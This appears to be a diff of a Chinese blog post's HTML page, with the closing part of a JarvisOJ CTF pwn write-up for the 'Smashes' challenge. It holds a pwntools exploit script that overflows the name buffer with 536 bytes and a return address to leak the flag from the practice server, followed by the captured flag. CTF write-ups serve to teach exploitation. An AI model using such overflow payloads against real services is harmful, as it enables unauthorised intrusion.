-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line"><span class="comment">#pro = process("./smashes")</span></div><div class="line">pro = remote(<span class="string">"pwn.jarvisoj.com"</span>, <span class="number">9877</span>)</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></div><div class="line">	pro.recvuntil(recv_buf)</div><div class="line">	<span class="keyword">if</span> new_line:</div><div class="line">		pro.sendline(send_buf)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		pro.send(send_buf)</div><div class="line">payload = <span class="string">"A"</span>*<span class="number">536</span></div><div class="line">payload += p64(<span class="number">0x400d20</span>)</div><div class="line">respone(<span class="string">"name?"</span>,payload)</div><div class="line">respone(<span class="string">"flag:"</span>,<span class="string">"What ever you want"</span>)</div><div class="line">pro.interactive()</div></pre></td></tr></table></figure>
-<p>简短的几句，然后就大功告成了。虽然代码很短，但是里面包含着很多知识点</p>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-33-51.jpg" alt="02-33-51.jpg" title="">
-<p><strong>Flag: PCTF{57dErr_Smasher_good_work!}</strong></p>
-
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/CTF/" rel="tag"># CTF</a>
-          
-            <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/01/16/PythonGUI模拟TCP／IP解、封包/" rel="next" title="PythonGUI模拟TCP／IP解、封包">
-                <i class="fa fa-chevron-left"></i> PythonGUI模拟TCP／IP解、封包
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/02/15/除夕随笔/" rel="prev" title="除夕随笔">
-                除夕随笔 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
-
-
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#pro = process("./smashes")</span></span><br><span class="line">pro = remote(<span class="string">"pwn.jarvisoj.com"</span>, <span class="number">9877</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span></span><br><span class="line">	pro.recvuntil(recv_buf)</span><br><span class="line">	<span class="keyword">if</span> new_line:</span><br><span class="line">		pro.sendline(send_buf)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		pro.send(send_buf)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">536</span></span><br><span class="line">payload += p64(<span class="number">0x400d20</span>)</span><br><span class="line">respone(<span class="string">"name?"</span>,payload)</span><br><span class="line">respone(<span class="string">"flag:"</span>,<span class="string">"What ever you want"</span>)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>
+<p>简短的几句，然后就大功告成了。虽然代码很短，但是里面包含着很多知识点<br>
+<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/02-33-51.jpg" alt=""><br>
+<strong>Flag: PCTF{57dErr_Smasher_good_work!}</strong></p>
 
         </div>
+
         
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name">W z</p>
-              <div class="site-description motion-element" itemprop="description"></div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
+            <section class="post-copyright">
                 
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">26</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>T3stzer0</span>
+                    </p>
                 
                 
-                <div class="site-state-item site-state-categories">
-                  
-                    
-                      <a href="/categories/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">2</span>
-                    <span class="site-state-item-name">分类</span>
-                  </a>
-                </div>
-              
-
-              
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://www.testzero-wz.com/2018/02/05/JarvisOJ-PWN-Writeup专题/">https://www.testzero-wz.com/2018/02/05/JarvisOJ-PWN-Writeup专题/</a></span>
+                    </p>
                 
                 
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">20</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
-              
-            </nav>
-          
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
 
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
                     
-                  
-                  
                     
-                  
-                  <a href="https://github.com/testzero-wz" title="GitHub &rarr; https://github.com/testzero-wz" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                        <a href="/tag/CTF/"># CTF</a>
+                    
+                        <a href="/tag/WriteUp/"># WriteUp</a>
+                    
+                        
                 </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="mailto:testzero.wz@gmail.com" title="E-Mail &rarr; mailto:testzero.wz@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
-                </span>
-              
             </div>
-          
-
-          
-
-          
-          
-
-          
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
             
-          
-          
+                <a class="prev" rel="prev" href="/2018/02/15/除夕随笔/">除夕随笔</a>
+            
+            
+            <a class="next" rel="next" href="/2018/01/16/PythonGUI模拟TCP／IP解、封包/">PythonGUI模拟TCP／IP解、封包</a>
+            
+        </section>
+
+
+    </article>
+</div>
 
         </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#引言"><span class="nav-number">1.</span> <span class="nav-text"> 引言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-0"><span class="nav-number"></span> <span class="nav-text"> level 0</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-1"><span class="nav-number"></span> <span class="nav-text"> level 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-2"><span class="nav-number"></span> <span class="nav-text"> level 2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-3"><span class="nav-number"></span> <span class="nav-text"> level 3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-4"><span class="nav-number"></span> <span class="nav-text"> level 4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#方法一"><span class="nav-number">1.</span> <span class="nav-text"> 方法一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法二"><span class="nav-number">2.</span> <span class="nav-text"> 方法二</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-5"><span class="nav-number"></span> <span class="nav-text"> level 5</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mprotect"><span class="nav-number">1.</span> <span class="nav-text"> mprotect</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mmap"><span class="nav-number">2.</span> <span class="nav-text"> mmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">3.</span> <span class="nav-text"> 思路</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-6"><span class="nav-number"></span> <span class="nav-text"> level 6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-2-x64"><span class="nav-number"></span> <span class="nav-text"> level 2 x64</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-3-x64"><span class="nav-number"></span> <span class="nav-text"> level 3 x64</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#test-your-memory"><span class="nav-number"></span> <span class="nav-text"> Test Your Memory</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#tell-me-something"><span class="nav-number"></span> <span class="nav-text"> Tell me something</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#smashes"><span class="nav-number"></span> <span class="nav-text"> Smashes</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#canary保护机制"><span class="nav-number">1.</span> <span class="nav-text"> Canary保护机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#elf文件段加载或者说内存映射关系"><span class="nav-number">2.</span> <span class="nav-text"> ELF文件段加载或者说内存映射关系</span></a></li></ol></div>
-            
-
-          </div>
-        </div>
-      <!--/noindex-->
-      
-
-      
-
+        <!-- 
+<footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© T3stzer0 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
     </div>
-  </aside>
-  
+</footer>
 
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">W z</span>
-
-  
-
-  
-</div>
-
-
-
-
-
-
-
-
-
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-  
-    <span class="post-meta-item-icon">
-    
-      <i class="fa fa-user"></i>
-	  总访客:
-    </span>
-    <span class="site-uv" title="总访客量">
-      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
-    </span>
-  
-
-  
-
-  
-</div>
-
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-    
-
-    
-  </div>
-
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
+-->
+    </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
 </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/src/utils.js?v=7.0.1"></script>
-
-  <script src="/js/src/motion.js?v=7.0.1"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/src/schemes/muse.js?v=7.0.1"></script>
-
-
-
-  
-  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
-<script src="/js/src/post-details.js?v=7.0.1"></script>
-
-
-
-  
-
-
-  <script src="/js/src/next-boot.js?v=7.0.1"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
-
-
-
-
-  
-
-  
-
-  
-  
-
-  
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
 </html>
